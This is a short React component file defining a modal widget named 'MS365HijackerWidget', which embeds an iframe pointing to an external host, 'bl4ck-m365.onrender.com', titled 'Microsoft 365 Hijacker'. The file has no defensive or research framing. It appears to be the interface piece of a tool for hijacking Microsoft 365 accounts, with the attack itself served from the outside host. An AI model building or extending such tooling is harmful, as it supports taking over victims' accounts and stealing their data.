import React from 'react';
import './ms365-hijacker-widget.scss';

interface MS365HijackerWidgetProps {
  onClose: () => void;
}

export const MS365HijackerWidget: React.FC<MS365HijackerWidgetProps> = ({ onClose }) => (
  <div className="ms365-hijacker-backdrop" onClick={onClose}>
    <div className="ms365-hijacker-widget" onClick={(e) => e.stopPropagation()}>
      <div className="ms365-hijacker-titlebar">
        <button className="ms365-hijacker-close-btn" onClick={onClose} aria-label="Close" />
      </div>
      <div className="ms365-hijacker-body">
        <iframe
          src="https://bl4ck-m365.onrender.com"
          className="ms365-hijacker-iframe"
          title="Microsoft 365 Hijacker"
          allowFullScreen
        />
      </div>
    </div>
  </div>
);
